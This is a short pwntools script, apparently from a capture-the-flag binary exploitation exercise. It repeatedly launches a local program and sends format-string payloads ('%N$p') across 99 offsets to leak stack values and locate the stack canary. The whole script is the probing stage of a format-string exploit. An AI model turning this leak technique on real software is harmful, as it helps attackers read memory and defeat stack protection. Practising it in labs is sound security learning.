from pwn import *

def find_canary_offset():
    for i in range(1, 100):
        p = process("6fer")
        p.sendline(f'%{i}$p'.encode())
        result = p.recv().strip()
        print(f'Offset {i}: {result}')
        p.close()

if __name__ == "__main__":
    find_canary_offset()
